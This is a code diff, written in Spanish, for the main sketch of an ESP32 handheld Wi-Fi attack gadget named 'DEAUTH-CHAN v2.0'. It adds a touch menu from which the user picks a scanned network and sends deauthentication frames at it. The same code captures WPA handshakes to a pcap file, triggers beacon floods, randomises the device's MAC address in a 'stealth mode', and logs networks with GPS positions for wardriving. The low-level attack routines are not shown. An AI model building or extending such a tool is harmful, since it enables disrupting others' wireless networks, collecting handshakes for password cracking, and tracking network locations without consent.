@@ -20,31 +20,217 @@ GPSModule gps;
 Wardriving wardriver;
 Learning learner;
 
+// Variables de redes
 RedInfo redes[20];
 int numRedes = 0;
+
+// Variables de escaneo
+bool scanning = false;
 unsigned long lastScanTime = 0;
 
-bool scanning = false;
-int redSeleccionada = -1;
-
+// Variables de clientes
 ClienteInfo* clientes = nullptr;
 int numClientes = 0;
-bool escaneandoClientes = false;
-unsigned long clientScanStart = 0;
 
+// --- MENÚ ---
+enum MenuScreen {
+    SCREEN_MAIN,
+    SCREEN_SCAN,
+    SCREEN_ATTACK,
+    SCREEN_CONFIG,
+    SCREEN_WARDRIVE
+};
+MenuScreen currentScreen = SCREEN_MAIN;
+int selectedNetworkIndex = -1;
+bool attackModeActive = false;
+
+// --- BOTONES ---
+struct Button {
+    int x, y, w, h;
+    char label[12];
+    bool pressed;
+};
+Button menuButtons[4] = {
+    {10, 280, 55, 30, "Escanear"},
+    {70, 280, 55, 30, "Atacar"},
+    {130, 280, 55, 30, "Config"},
+    {190, 280, 55, 30, "Wardrive"}
+};
+
+// --- CALLBACKS ---
 void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
     uint32_t ts = millis();
     pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
     mascota.incrementarHandshakes();
     Serial.printf("Handshake capturado! %d bytes\n", len);
-    // Notificar al sistema de aprendizaje
-    // (se necesitaría extraer el BSSID del frame para registrar la red)
 }
 
+// --- DIBUJO DE INTERFAZ ---
+void drawMainUI() {
+    // Barra superior (ya la dibuja Mascota::dibujarUI)
+    // Pero añadimos info extra si queremos
+}
+
+void drawMenuButtons() {
+    for (int i = 0; i < 4; i++) {
+        int color = (currentScreen == i) ? TFT_GREEN : TFT_DARKGREY;
+        tft.fillRoundRect(menuButtons[i].x, menuButtons[i].y, menuButtons[i].w, menuButtons[i].h, 4, color);
+        tft.drawRoundRect(menuButtons[i].x, menuButtons[i].y, menuButtons[i].w, menuButtons[i].h, 4, TFT_WHITE);
+        tft.setTextColor(TFT_WHITE);
+        tft.setTextSize(1);
+        tft.setCursor(menuButtons[i].x + 4, menuButtons[i].y + 10);
+        tft.print(menuButtons[i].label);
+    }
+}
+
+void drawNetworkList() {
+    // Limpiar área de lista (debajo de la mascota)
+    tft.fillRect(0, 100, 240, 180, TFT_BLACK);
+    int yOffset = 110;
+    for (int i = 0; i < numRedes && i < 8; i++) {
+        char buf[32];
+        sprintf(buf, "%d.%s", i+1, redes[i].ssid);
+        if (strlen(redes[i].ssid) == 0) {
+            sprintf(buf, "%d.*OCULTA*", i+1);
+        }
+        tft.setTextColor(TFT_YELLOW);
+        tft.setCursor(5, yOffset);
+        tft.print(buf);
+        tft.setTextColor(TFT_WHITE);
+        tft.setCursor(160, yOffset);
+        tft.print(redes[i].rssi);
+        tft.print("dBm");
+        yOffset += 20;
+    }
+}
+
+void drawConfigScreen() {
+    tft.fillRect(0, 100, 240, 180, TFT_BLACK);
+    tft.setTextColor(TFT_CYAN);
+    tft.setCursor(10, 110);
+    tft.print("MODO SIGILOSO: ");
+    tft.setTextColor(hunter.isSilentMode() ? TFT_GREEN : TFT_RED);
+    tft.print(hunter.isSilentMode() ? "ON" : "OFF");
+    tft.setCursor(10, 140);
+    tft.setTextColor(TFT_WHITE);
+    tft.print("[Toca para cambiar]");
+    
+    tft.setCursor(10, 170);
+    tft.setTextColor(TFT_YELLOW);
+    tft.print("BEACON FLOOD:");
+    tft.setTextColor(TFT_WHITE);
+    tft.setCursor(10, 185);
+    tft.print("SSID: DEAUTH_TEST");
+    tft.setCursor(10, 210);
+    tft.print("[Toca para enviar]");
+    
+    tft.setCursor(10, 240);
+    tft.setTextColor(TFT_PURPLE);
+    tft.print("RANDOM MAC:");
+    tft.setTextColor(TFT_WHITE);
+    tft.setCursor(10, 255);
+    tft.print("[Toca para cambiar]");
+}
+
+void drawWardriveScreen() {
+    tft.fillRect(0, 100, 240, 180, TFT_BLACK);
+    tft.setTextColor(TFT_ORANGE);
+    tft.setCursor(10, 110);
+    tft.print("WARDROVING");
+    tft.setTextColor(TFT_WHITE);
+    tft.setCursor(10, 130);
+    tft.print("GPS: ");
+    GPSData pos = gps.getData();
+    tft.print(pos.valid ? "FIX" : "NO FIX");
+    tft.setCursor(10, 150);
+    tft.print("SAT: ");
+    tft.print(pos.satellites);
+    tft.setCursor(10, 170);
+    tft.print("REDES GUARDADAS: ");
+    // Contar líneas del CSV (simplificado)
+    File f = SD.open("/wardriving.csv", FILE_READ);
+    int lines = 0;
+    if (f) {
+        while (f.available()) { if (f.read() == '\n') lines++; }
+        f.close();
+    }
+    tft.print(lines-1); // Restar cabecera
+    
+    tft.setCursor(10, 200);
+    tft.setTextColor(TFT_YELLOW);
+    tft.print("[Toca para exportar KML]");
+}
+
+// --- MANEJO DE TOQUES ---
+void handleTouch(int x, int y) {
+    // Botones del menú
+    for (int i = 0; i < 4; i++) {
+        if (x >= menuButtons[i].x && x <= menuButtons[i].x + menuButtons[i].w &&
+            y >= menuButtons[i].y && y <= menuButtons[i].y + menuButtons[i].h) {
+            currentScreen = (MenuScreen)i;
+            return;
+        }
+    }
+    
+    // Comportamiento según pantalla
+    switch (currentScreen) {
+        case SCREEN_SCAN:
+            // Tocar para iniciar escaneo manual
+            if (y > 100 && y < 200) {
+                mascota.setEstado(ESTADO_SCANNING);
+                hunter.startScan();
+                scanning = true;
+            }
+            break;
+            
+        case SCREEN_ATTACK:
+            // Tocar una red de la lista para atacarla
+            if (y > 100 && y < 280 && numRedes > 0) {
+                int index = (y - 110) / 20;
+                if (index < numRedes) {
+                    mascota.setEstado(ESTADO_ATTACK);
+                    hunter.deauth(redes[index], nullptr, 30);
+                    learner.registerAttack(redes[index]);
+                    delay(200);
+                    mascota.setEstado(ESTADO_IDLE);
+                }
+            }
+            break;
+            
+        case SCREEN_CONFIG:
+            // Configuración
+            if (x > 10 && x < 150) {
+                if (y > 110 && y < 130) {
+                    // Toggle Sigiloso
+                    hunter.setSilentMode(!hunter.isSilentMode());
+                }
+                if (y > 170 && y < 230) {
+                    // Beacon Flood
+                    hunter.beaconFlood("DEAUTH_TEST", 50);
+                }
+                if (y > 240 && y < 270) {
+                    // Random MAC
+                    hunter.randomizeMAC();
+                }
+            }
+            break;
+            
+        case SCREEN_WARDRIVE:
+            if (y > 200 && y < 230) {
+                wardriver.exportKML();
+            }
+            break;
+            
+        default:
+            break;
+    }
+}
+
+// --- SETUP ---
 void setup() {
     Serial.begin(115200);
     delay(1000);
-    Serial.println("DEAUTH-CHAN v1.0");
+    Serial.println("DEAUTH-CHAN v2.0 - INTERFAZ PROFESIONAL");
     
     pinMode(TFT_LED_PIN, OUTPUT);
     digitalWrite(TFT_LED_PIN, HIGH);
@@ -63,80 +249,70 @@ void setup() {
     gps.begin();
     hunter.begin();
     hunter.setHandshakeCallback(onHandshakeCaptured);
-    
-    // Inicializar wardriving y aprendizaje
     wardriver.begin();
     learner.begin();
-    
-    // Modo sigiloso (opcional)
-    // hunter.setSilentMode(true);
-    // hunter.randomizeMAC();
     
     Serial.println("Setup completado");
 }
 
+// --- LOOP ---
 void loop() {
     gps.update();
     hunter.processPendingHandshakes();
     mascota.update();
-    mascota.dibujar();
     
-    // --- Táctil ---
+    // --- DIBUJAR TODO ---
+    mascota.dibujar();  // Dibuja la mascota y la barra superior
+    drawMenuButtons();  // Dibuja los botones de navegación
+    
+    // Dibujar contenido según pantalla
+    switch (currentScreen) {
+        case SCREEN_MAIN:
+            tft.fillRect(0, 100, 240, 180, TFT_BLACK);
+            tft.setTextColor(TFT_WHITE);
+            tft.setCursor(30, 150);
+            tft.print("Bienvenido");
+            tft.setCursor(50, 180);
+            tft.print("Toca un boton");
+            break;
+        case SCREEN_SCAN:
+            drawNetworkList();
+            if (scanning && hunter.isScanDone()) {
+                hunter.getScanResults(redes, 20, numRedes);
+                mascota.setRedesEncontradas(numRedes);
+                scanning = false;
+                mascota.setEstado(ESTADO_IDLE);
+                // Guardar en CSV con wardriving
+                GPSData pos = gps.getData();
+                for (int i = 0; i < numRedes; i++) {
+                    wardriver.saveNetwork(redes[i], pos);
+                }
+                Serial.printf("Escaneo completado: %d redes\n", numRedes);
+            }
+            break;
+        case SCREEN_ATTACK:
+            drawNetworkList();
+            break;
+        case SCREEN_CONFIG:
+            drawConfigScreen();
+            break;
+        case SCREEN_WARDRIVE:
+            drawWardriveScreen();
+            break;
+    }
+    
+    // --- TÁCTIL ---
     if (touch.touched()) {
         TS_Point p = touch.getPoint();
         int x = map(p.x, 0, 4095, 0, 240);
         int y = map(p.y, 0, 4095, 0, 320);
         
-        if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
-            int indice = (y - 200) / 20;
-            if (indice < numRedes) {
-                redSeleccionada = indice;
-                mascota.setEstado(ESTADO_ATTACK);
-                
-                // Ataque a la red seleccionada (broadcast)
-                hunter.deauth(redes[redSeleccionada], nullptr, 30);
-                // Registrar el ataque en el sistema de aprendizaje
-                learner.registerAttack(redes[redSeleccionada]);
-                
-                // Opcional: atacar a un cliente específico (descomentar para escanear clientes)
-                // hunter.scanClients(redes[redSeleccionada].bssid, redes[redSeleccionada].canal);
-                // clientes = hunter.getClientes(numClientes);
-                
-                delay(100);
-                mascota.setEstado(ESTADO_IDLE);
-            }
-        } else if (mascota.getEstado() == ESTADO_IDLE && y > 100 && y < 200) {
-            // Zona para mostrar clientes (se puede implementar después)
-            // Aquí podrías listar los clientes y al tocar uno, atacarlo específicamente
-        } else {
+        // Si toca la mascota (zona central), interactuar con ella
+        if (x >= 80 && x <= 240 && y >= 100 && y <= 280) {
             mascota.tocar(x, y);
+        } else {
+            handleTouch(x, y);
         }
-    }
-    
-    // --- Escaneo de redes ---
-    if (!scanning && millis() - lastScanTime > SCAN_INTERVAL) {
-        mascota.setEstado(ESTADO_SCANNING);
-        hunter.startScan();
-        scanning = true;
-    }
-    
-    if (scanning && hunter.isScanDone()) {
-        hunter.getScanResults(redes, 20, numRedes);
-        mascota.setRedesEncontradas(numRedes);
-        
-        // Priorizar redes según aprendizaje
-        learner.prioritizeNetworks(redes, numRedes);
-        
-        GPSData pos = gps.getData();
-        // Guardar en CSV con wardriving
-        for (int i = 0; i < numRedes; i++) {
-            wardriver.saveNetwork(redes[i], pos);
-        }
-        
-        mascota.setEstado(ESTADO_IDLE);
-        scanning = false;
-        lastScanTime = millis();
-        Serial.printf("Escaneo completado: %d redes\n", numRedes);
     }
     
     delay(10);
